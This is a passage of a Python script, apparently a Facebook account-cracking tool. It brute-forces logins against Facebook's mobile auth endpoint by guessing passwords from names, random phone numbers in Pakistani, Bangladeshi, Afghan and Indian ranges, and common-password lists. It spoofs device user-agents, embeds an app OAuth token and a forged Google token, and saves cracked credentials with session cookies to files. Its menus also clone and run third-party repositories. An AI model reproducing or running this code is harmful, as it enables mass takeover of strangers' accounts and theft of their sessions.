                        data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': code3,'client_country_code': loc3,'fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
                        headers = {'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','Priority': 'u=3, i','X-Fb-Sim-Hni': '45204','X-Fb-Net-Hni': '45201','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent': ua,'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '5120','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '847'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G} [JUTT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        os.system('espeak -a 300 " Crack,   Successfully,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        #print(f' COOKIES: \033[1;32m'+cookies)
                                        open('/sdcard/JUTT/JUTT-M3-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/JUTT/JUTT-M3-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [JUTT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JUTT/JUTT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                time.sleep(20)
#<<_________[ METHOD 4 ]_________>>#
def ffb4(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}JUTT{W}]{R} %s{W} | {R}M4 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        FBLC = random.choice(['id_ID', 'ur_PK', 'bd_BD', 'fr_FR','it_IT', 'ar_SD', 'en_US', 'es_MX', 'nl_NL'])            
                        FBCR = random.choice(["null","Null","Zong","Ufone","Telenor","PK-UFONE","Jazz"])
                        FBSV = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
                        facebook_version = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        facebookv = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        fbhlfend = random.choice(["199","477","129","66","375","247","201","236","129","70","116","186","169","118","120","123","121","112","107","117","124","119","127","125","109","127","111","117","118","115","241"])
                        fbbv = str(random.randint(11111111, 99999999))
                        fbrv = str(random.randint(11111111, 99999999))
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        sim = random.choice(['null', 'Null', 'Zong', 'Ufone', 'Telenor', 'PK-UFONE', 'Jazz'])
                        andver = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', ' 13'])
                        country = (['en_US', 'en_GB', 'pt_BR', 'ko_KR', 'ex_MX', 'it_IT', 'np_NP'])
                        fbaan = random.choice(['FB4A', 'Orca-Android'])
                        fbweb = random.choice(['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite', 'com.facebook.mlite'])
                        fbpn = random.choice(['com.facebook.katana', 'com.facebook.orca'])
                        reamodels = random.choice(['Redmi 01A', 'Redmi 1', 'Redmi 10', 'Redmi 10 (2022)', 'Redmi 10 5G', 'Redmi 10 Prime', 'Redmi 10 Prime (2022)', 'Redmi 10 Prime+ 5G', 'Redmi 10A', 'Redmi 10C', 'Redmi 10I', 'Redmi 10S', 'Redmi 10X', 'Redmi 10X Pro', 'Redmi 11', 'Redmi 11 Prime', 'Redmi 11X', 'Redmi 12', 'Redmi 12C', 'Redmi 1S', 'Redmi 2', 'Redmi 2A', 'Redmi 3', 'Redmi 3S', 'Redmi 3X', 'Redmi 4', 'Redmi 4 Prime', 'Redmi 4 Pro', 'Redmi 41224', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5 Pro', 'Redmi 5A', 'Redmi 5pro', 'Redmi 5S', 'Redmi 6', 'Redmi 6 Pro', 'Redmi 6 Pro Extreme'])
                        yes = random.choice(['Mi 10', 'Mi 10 Lite 5G', 'Mi 10 Lite Zoom', 'Mi 10 Pro', 'Mi 10 Ultra', 'Mi 10 Ultra 5G', 'Mi 10i', 'Mi 10S', 'Mi 10T', 'Mi 10T 5G', 'Mi 10T Lite', 'Mi 10T Lite 5G', 'Mi 10T Pro', 'Mi 10T Pro 5G', 'Mi 11', 'Mi 11 Lite', 'Mi 11 Lite 5G', 'Mi 11 Lite 5G NE', 'Mi 11 Pro', 'Mi 11 Ultra', 'Mi 11i', 'Mi 11T', 'Mi 11T Pro', 'Mi 11X', 'Mi 11X Pro', 'Mi 13 Ultra Test', 'Mi 1S', 'Mi 2', 'Mi 2A', 'Mi 2S', 'Mi 2SC', 'Mi 3', 'Mi 30 Pro', 'Mi 3C', 'Mi 3W', 'Mi 4', 'Mi 4 LTE', 'Mi 4C', 'Mi 4i', 'Mi 4S'])
                        e = f"[FBAN/FB4A;FBAV/{facebookv};FBBV/{fbbv};"
                        u1 = f"[FBAN/Orca-Android;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.orca;FBLC/en_BD;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Xiaomi;FBDV{yes};FBSV/{FBSV};FBCA/arm64-v8a:null;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        u2 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/{fbweb};FBLC/en_BD;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Xiaomi;FBDV{yes};FBSV/{FBSV};nullFBCA/armeabi-v7a:armeabi;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        i3 = f"[FBAN/FB4A;FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};[FBAN/{FBAN};FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height};FBLC/en_US;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Redmi;FBDV/{reamodels};FBSV/{andver};FBCA/armeabi-v7a:armeabi;]"
                        x1 = e + u1
                        x2 = e + u2
                        x3 = e + i3
                        ua = random.choice([x1,x2,x3])
                        data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': code4,'client_country_code': loc4,'fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
                        headers={'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','Priority': 'u=3, i','X-Fb-Sim-Hni': '45204','X-Fb-Net-Hni': '45201','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent': ua,'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '5120','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '22'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G} [JUTT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        os.system('espeak -a 300 " Crack,   Successfully,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        #print(f' COOLIES: \033[1;32m'+cookies)
                                        open('/sdcard/JUTT/JUTT-M4-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/JUTT/JUTT-M4-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [JUTT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JUTT/JUTT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                time.sleep(20)
####FILE CREAT MENU###
def Create_menu():
        clear()
        os.system('espeak -a 300 " Wellcome, To,  File,  , Menu,"')
        print(f'{W} [{R}1{W}] {W}CREATE FILE BY JUTT TOOL ')
        print(f'{W} [{R}2{W}] {W}CREATE FILE BY HANNAN TOOL ')
        print(f'{W} [{R}0{W}] {W}BACK MAIN MENU ')
        line()
        option=input(f'{W} [{R}+{W}] {W}CHOICE MENU >> ')
        if option in ['1','01']:
                os.system("cd && git clone --depth=1 https://github.com/Rananadeem5214/File11")
                os.system('cd && cd File11 ;python Extract.py')
        if option in ['2','02']:
                Create_M2()
        if option in ['0','00']:
                menu()()
        else:
                line()
        print(f'{W} [{R}+{W}] {W}SELECTED WRONG OPTION')
        time.sleep(2)
        Create_menu()
#####____Create-File-M1____#####

#####____Create-File-M2____#####
def Create_M2():
                os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
                os.system('cd && cd FILE ;python V33.py')
######RANDOM CLONE###
def Main_Menu():
    clear()
    print(f'{W} [{R}1{W}] {W}PAK CLONING\n{W} [{R}2{W}] {W}BD CLONING\n{W} [{R}3{W}] {W}AFG CLONING\n{W} [{R}4{W}] {W}INDIA CLONING\n{W} [{R}0{W}] {W}BACK MENU')
    os.system('espeak -a 300 " Random,  Cloning, Menu,"')
    line()
    option=input(f'{W} [{R}+{W}] {W}CHOICE MENU >> ')
    if option in ['1','01']:
        pak()
    if option in ['2','02']:
        bd()
    if option in ['3','03']:
        afg()
    if option in ['4','04']:
        ind()
    if option in ['0','00']:
        menu()
    else:
        line()
    print(f'{W} [{R}+{W}] {W}SELECTED WRONG OPTION')
    time.sleep(2)
    Main_Menu()
#####____Random-Method-Setup____#####
def pak():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 0300,0315,0333,0345')
                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
                clear()
                try:
                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as JUTTg1:
                        clear()

                        tl = str(len(user))
                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist=[psx,ids]
                                JUTTg1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
                menu()
def bd():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 017,016,018')
                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
                clear()
                try:
                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=50) as JUTTg1:
                        clear()

                        tl = str(len(user))
                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','57273200']
                                JUTTg1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'{W} [{R}+{W}] {W} THE PROCESS HAS COMPLETED')
                print(f'{W} [{R}+{W}] {W} TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'{W} [{R}+{W}] {W} PRESS ENTER TO BACK ')
                menu()

def afg():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 9377,9379,9374')
                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
                clear()
                try:
                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=50) as JUTTg1:
                        clear()

                        tl = str(len(user))
                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                JUTTg1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
                menu()
def ind():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 91***,etc')
                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
                clear()
                try:
                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=50) as JUTTgg:
                        clear()

                        tl = str(len(user))
                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'57273200','hindustan','57575751']
                                JUTTgg.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
                menu()

def rd(uid,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r\r{W} [{R}JUTT{W}]%s|{R}RNDM{W}|\033[1;32mOK:%s\033[1;37m|{R}CP:%s\033[1;37m'%(loop,len(ok),len(cp)));sys.stdout.flush()
                FBLC = random.choice(['id_ID', 'ur_PK', 'bd_BD', 'fr_FR','it_IT', 'ar_SD', 'en_US', 'es_MX', 'nl_NL'])            
                FBCR = random.choice(["null","Null","Zong","Ufone","Telenor","PK-UFONE","Jazz"])
                FBSV = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
                facebook_version = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                facebookv = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                fbhlfend = random.choice(["199","477","129","66","375","247","201","236","129","70","116","186","169","118","120","123","121","112","107","117","124","119","127","125","109","127","111","117","118","115","241"])
                fbbv = str(random.randint(11111111, 99999999))
                fbrv = str(random.randint(11111111, 99999999))
                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
                width = random.randint(720, 1440)
                height = random.randint(1080, 2560)
                sim = random.choice(['null', 'Null', 'Zong', 'Ufone', 'Telenor', 'PK-UFONE', 'Jazz'])
                andver = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', ' 13'])
                country = (['en_US', 'en_GB', 'pt_BR', 'ko_KR', 'ex_MX', 'it_IT', 'np_NP'])
                fbaan = random.choice(['FB4A', 'Orca-Android'])
                fbweb = random.choice(['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite', 'com.facebook.mlite'])
                fbpn = random.choice(['com.facebook.katana', 'com.facebook.orca'])
                reamodels = random.choice(['Redmi 01A', 'Redmi 1', 'Redmi 10', 'Redmi 10 (2022)', 'Redmi 10 5G', 'Redmi 10 Prime', 'Redmi 10 Prime (2022)', 'Redmi 10 Prime+ 5G', 'Redmi 10A', 'Redmi 10C', 'Redmi 10I', 'Redmi 10S', 'Redmi 10X', 'Redmi 10X Pro', 'Redmi 11', 'Redmi 11 Prime', 'Redmi 11X', 'Redmi 12', 'Redmi 12C', 'Redmi 1S', 'Redmi 2', 'Redmi 2A', 'Redmi 3', 'Redmi 3S', 'Redmi 3X', 'Redmi 4', 'Redmi 4 Prime', 'Redmi 4 Pro', 'Redmi 41224', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5 Pro', 'Redmi 5A', 'Redmi 5pro', 'Redmi 5S', 'Redmi 6', 'Redmi 6 Pro', 'Redmi 6 Pro Extreme'])
                yes = random.choice(['Mi 10', 'Mi 10 Lite 5G', 'Mi 10 Lite Zoom', 'Mi 10 Pro', 'Mi 10 Ultra', 'Mi 10 Ultra 5G', 'Mi 10i', 'Mi 10S', 'Mi 10T', 'Mi 10T 5G', 'Mi 10T Lite', 'Mi 10T Lite 5G', 'Mi 10T Pro', 'Mi 10T Pro 5G', 'Mi 11', 'Mi 11 Lite', 'Mi 11 Lite 5G', 'Mi 11 Lite 5G NE', 'Mi 11 Pro', 'Mi 11 Ultra', 'Mi 11i', 'Mi 11T', 'Mi 11T Pro', 'Mi 11X', 'Mi 11X Pro', 'Mi 13 Ultra Test', 'Mi 1S', 'Mi 2', 'Mi 2A', 'Mi 2S', 'Mi 2SC', 'Mi 3', 'Mi 30 Pro', 'Mi 3C', 'Mi 3W', 'Mi 4', 'Mi 4 LTE', 'Mi 4C', 'Mi 4i', 'Mi 4S'])
                e = f"[FBAN/FB4A;FBAV/{facebookv};FBBV/{fbbv};"
                u1 = f"[FBAN/Orca-Android;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.orca;FBLC/en_BD;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Xiaomi;FBDV{yes};FBSV/{FBSV};FBCA/arm64-v8a:null;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                u2 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/{fbweb};FBLC/en_BD;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Xiaomi;FBDV{yes};FBSV/{FBSV};nullFBCA/armeabi-v7a:armeabi;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                i3 = f"[FBAN/FB4A;FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};[FBAN/{FBAN};FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height};FBLC/en_US;FBCR/{FBCR};FBMF/Xiaomi;FBBD/Redmi;FBDV/{reamodels};FBSV/{andver};FBCA/armeabi-v7a:armeabi;]"
                x1 = e + u1
                x2 = e + u2
                x3 = e + i3
                ua = 'Davik/2.1.0 (Linux; U; Android 9.0.0; GT-N7105T Build/SQ3A.421532.469[FBAN/FB4A;FBAV/253.0.0.38134;FBBV/86586140;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/86586140;FBCR/Airtle;FBMF/OPPO;FBBD/OPPO;FBPN/e;FBDV/GT-N7105T;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                for pas in passlist:
                        data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': uid,
'password': pas,
'method': 'auth.login',
'generate_session_cookies': '1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'error_detail_type': 'button_with_disabled',
'source': 'account_recovery',
'locale': 'en_GB',
'client_country_code': 'GB',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
                        head = {'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'Priority': 'u=3, i',
'X-Fb-Sim-Hni': '45204',
'X-Fb-Net-Hni': '45201',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
'User-Agent': ua,
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'MOBILE.LTE',
'X-Fb-Device-Group': '5120',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
